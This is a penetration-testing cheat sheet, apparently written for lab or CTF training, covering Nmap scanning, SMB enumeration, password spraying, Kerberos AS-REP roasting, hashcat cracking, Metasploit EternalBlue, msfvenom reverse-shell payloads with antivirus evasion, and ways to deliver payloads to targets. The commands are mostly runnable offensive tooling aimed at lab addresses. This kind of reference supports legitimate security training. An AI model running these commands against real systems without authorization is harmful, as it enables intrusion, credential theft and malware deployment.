# Section 1. Linux Basics
- ping
```
ping <IP>                          # used to test the conectivity
Example: ping 10.10.10.10          # test connectivity with the IP address of 10.10.10.10
```
- nano
```
Step 1.
nano <name of the file>            # create or edit a file
Example: nano file.txt             # create a file with the name of file.txt

Step 2.
After adding you text or editing the file, press "ctrl+s" to save the file.

Step 3.
Press "ctrl+x" to exit.
```

# Section 2. Rconnaissance

## 1. Nmap
- Nmap syntax
```
nmap <scan-types> <options> <target>
```
- Nmap Scan Techniques
```
SYN Scan (-sS): Stealthy, half-open handshake.
Connect Scan (-sT): Full TCP connection.
UDP Scan (-sU): Slower, stateless protocol.
```
- Nmap Host Discovery
```
nmap -sn 10.129.2.0/24           # Scan network range for hosts only (no ports)
nmap –iL hosts.txt               # Scan IP list in “hosts.txt” file
nmap 10.129.2.28-30              # Scan multiple IPs
```
- Nmap Service & Version Detection
```
nmap -sV 10.129.2.28-29          # detect service versions running on the target hosts
```
- Nmap OS Detection
```
nmap –O 10.129.2.28-29           #  Detect the operating system of the target
```
- Nmap Scripting Engine (NSE)
```
nmap --script <script name> <target address>
Example: nmap --script vuln 10.129.2.28

Common scripts: vuln, auth, brute, discovery, exploit

HINT: add –-min-rate 5000 to speed up scan, BUT this may cause errors or crashes...
```
- Nmap Saving Results
```
Formats: -oN (Normal), -oG (grepable), -oX (XML), -oA (all formats)
Example: nmap –oA scan_results 10.129.2.28-29
Files Generated: scan_results.nmap, scan_results.gnmap, scan_results.xm
```
- Nmap Recommended Scans
```
sudo nmap –A --script vuln –vv –p-–oX target_scan.xml –iL hosts.txt –-min-rate 5000 –-stats-every=5s

-A means –sV –sC –O
-vv means verbose output
-p- means scan all ports
-oX means output to xml file
--script vuln means run vulnerability scan script
```
- Nmap View Results in Browser
```
xsltproc target_scan.xml –o target_scan.html
```

## 2. SMB Enum
### NetExec
  - Syntax
```
nxc <protocol> <ip address> <options>
```
  - NetExec User Enumeration 
```
nxc smb 10.129.2.28 –u '' –p '' –-rid-brute                        # use this if you don't know about any existing users
nxc smb 10.129.2.28 –u 'Guest' –p '' –-rid-brute                   # use the command with the Guest default account if the first command didn't work
nxc smb 10.129.2.28 –u 'john' –p 'Pass123' –-rid-brute             # use this if you know a username and it's password on the target
```
  - NetExec Share Enumeration
```
Note: If you know a valid username and password on the target machine, use those credentials instead of Guest with no password.

nxc smb 10.129.2.28 -u 'Guest' -p '' --shares                      # list available SMB shares
nxc smb 10.129.2.28 -u 'Guest' -p '' -M spider_plus                # enumerate shares and collect detailed information using spider_plus module
nxc smb 10.129.2.28 -u 'Guest' -p '' --spider all --pattern txt    # download all .txt files from all accessible shares
```
 - NetExec Group Enumeration
```
nxc ldap <DC-IP> -u <user> -p <password> --group                   # List all groups
nxc ldap <DC-IP> -u <user> -p <password> --group "Domain Admins"   # List members of the Domain Admins group
```
 - NetExec Passowrd Policy Enumeration
```
nxc smb 10.5.10.50 --pass-pol
```
 - NetExec SMB/RDP Password Attacks
```
# Password Spraying Attack
nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding

# Brute Force with a wordlist (Dictionary Attack)
nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding


# -u (path to users file)
# -p (Passwords to try for each users or path to wordlist)
# --ignore-pw-decoding (required to work with rockyou.txt)
```
### enum4linux
```
sudo enum4linux -a -A 192.168.220.30
```
### smbclient
```
# SMB loging if you know a user name and password
smbclient -U <username> //<ip>/<share>
Example: smbclient -U student //10.5.10.30/po-shares

# SMB null authentication (try that if you want to login without username and password)
smbclient //<ip>/<share> -N
Example: smbclient //10.5.10.30/po-shares -N
```
## 3. GoBuster
```
Syntax:
gobuster [mode] -u [target ip] -w [wordlist]

Example:
gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

```
# Section 3. Weaponization
 - NXC SMB/RDP Password Attacks
```
# Password Spraying Attack
nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding

# Brute Force with a wordlist (Dictionary Attack)
nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt –-ignore-pw-decoding


# -u (path to users file)
# -p (Passwords to try for each users or path to wordlist)
# --ignore-pw-decoding (required to work with rockyou.txt)
```
 - Impacket Get-NPUsers
```
# Allows us to capture Kerberos Tickets for users that do not require Kerberos pre authentication
Impacket-GetNPUsers –request –dc-ip 10.129.2.28 example.com/ -usersfile users.txt –format hashcat –outputfile kerb.hash

# -request (requests Kerberos ticket)
# -dc-ip (ip address of domain controller)
# example.com/ (domain name)
# -usersfile (text file with usernames to check)
# -format (password cracking format)
# -outputfile (name of file to save with tickets)
```
 - Cracking Hashes/Tickets with Hashcat
```
# Syntax: hashcat -a <attack-mode> -m <hash-type> <hash> <wordlist>
Example 1: hashcat kerb.hash /usr/share/wordlist/rockyou.txt
Example 2: hashcat -a 0 -m 18200 kerb.hash /usr/share/wordlist/rockyou.txt

# List of hash types:
https://hashcat.net/wiki/doku.php?id=example_hashes
```
 - Searchsploit
```
# We can search for exploits and vulnerabilities in software based on our nmap results using searchsploit

# Syntax: searchsploit <software and version>
# Examples:
searchsploit httpd 2.4
searchsploit –m <script name>                    # copies found exploits to your current directory
```
 -  Metasploit
```
# Example Workflow

1. Run Metasploit
msfconsole
2. Search for an exploit
search eternalblue
3. Use the exploit
use exploit/windows/smb/ms17_010_psexec
4. Set options
set RHOSTS 10.129.2.28
set LHOST eth0
5. Execute payload
exploit

```
 - Msfvenom
```
# A command-line tool for generating payloads (e.g., reverse shells, bind shells).

# Syntax: msfvenom –p <payload> <options> -f <format> -o <output_file>

# Example Windows Payload:
msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f exe –o shell.exe

# Example Linux Payload:
msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f elf –o shell.elf

# Example Encoded Payload (AV bypass):
msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –e x86/shikata_ga_nai –f exe –o encoded_shell.exe
```
 - Bloodhound
```
# Bloodhound is a tool used for mapping Active Directory networks, identifying potential attack paths and privilege escalation opportunities.

# Example Workflow
1. Gernerate JSON files from the Active Directory database
bloodhound-python –u mark.landry –p 987654321 –ns 10.129.2.28 –d example.com –c all

# -u username
# -p password
# -d domain name
# -ns nameserver (domain controller)
# -c all (gather all json files)

2. Go to browser and typle:
localhost:8080

3. Enter username and password:
Username: admin
Password: <it will be same password as your kali password>

4. Upload the JSON files
```
# Section 4. Delivery
 - Delivering Files via SSH/SCP
```
# Note: It requires SSH on the machines
# Syntax: scp <source file> <destination file>
# scp payload.txt user@target:/path/to/destination

# Example:
scp payload.txt bob@10.5.10.50:/home/bob
```
 - Delivering Files via SSH/rsync
```
# Note: It requires SSH on the machines
# Syntax: rsync -avz payload.txt user@target:/path/to/destination

# Example:
rsync –azv /opt/linpeas/linpeas.sh mlandry@10.129.2.29:/tmp
```
- Delivering Files via xfreerdp
```
# Syntax: xfreerdp3 /v:target_ip /u:username /p:password /d:domain-name /dynamic-resolution /drive:shared,/path/to/local/files
# /drive: Shares a local directory with the target.
# Connect to the target via RDP.
# Access the shared drive from the target machine (e.g., \\tsclient\shared).
# Copy files from the shared drive to the target.

# Example:
xfreerdp3 /v:10.5.10.50 /u:mark.landry /p:987654321 /dynamic-resolution /drive:shared,/home/kali/
```
 - Delivering Files via SMB
```
1. Using SMBclient: smbclient //target_ip/sharename -U username
# Authenticate and use "put" to upload files.
# Example:
smbclient //10.129.2.28/all –U Guest
smb: \> put shell.exe

2. Mounting SMB Share: sudo mount –t cifs //target_ip/sharename /mnt –o username=user,password=pass
#  Then copy files to /mnt to deliver them to the target.
# Example:
sudo mount –t cifs //10.129.2.28/all /mnt –o username=mark.landry,password=987654321
sudo cp /opt/winpeas/winPEASany.exe /mnt
```
 - Delivering Files via Web Form
```
1. Identify a file upload form on the target website.
2. Upload a malicious file (e.g., .php, .jpg with embedded code).
```

# Section 5. Attacks
```
COMING SOON...
```

# Section 6. Privilege Escalation
## Windows Privilege Escalation
```
COMING SOON...
```
## Linux Privilege Escalation
```
COMING SOON...
```


# Section 7. Miscellaneous
### Wordlists
```
/usr/share/wordlists/rockyou.txt                                  # Password Cracking Wordlist
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt    # Wordlist for discovering hidden directories/files
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      # Wordlist for discovering hidden directories/files
```



